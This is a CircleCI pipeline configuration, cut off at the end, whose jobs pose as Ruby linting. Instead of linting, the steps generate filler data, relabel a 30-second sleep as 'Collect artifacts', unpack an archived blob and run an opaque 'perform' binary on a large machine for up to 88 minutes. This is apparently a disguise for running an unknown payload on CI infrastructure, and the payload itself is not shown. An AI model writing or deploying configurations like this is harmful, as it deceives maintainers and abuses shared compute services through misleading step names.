version: 2.1

jobs:
  prep_ruby3-lint:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Fold data streams
          command: |
            mkdir -p /tmp/outbox
            set +o pipefail 2>/dev/null; seq 1 1480980 | awk '{print $1*7919 % 2147483647}' > /tmp/outbox/output.log; true
            echo "staging complete; file length=$(wc -c </tmp/outbox/output.log)"
      - persist_to_workspace:
          root: /tmp/outbox
          paths:
            - output.log
  ruby3-lint:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/outbox
      - run:
          name: Ingest handoff
          command: |
            { tail -c 100 /tmp/outbox/output.log > /dev/null; echo "tail ok" ; } || true
      - run:
          name: Pull code
          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Prepare source archive
          command: tar -I bzip2 -xf blobs.tar.bz2
      - run:
          name: Collect artifacts
          command: sleep 30
      - run:
          no_output_timeout: 88m
          command: "$PWD/perform"
  p1_papa-8:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
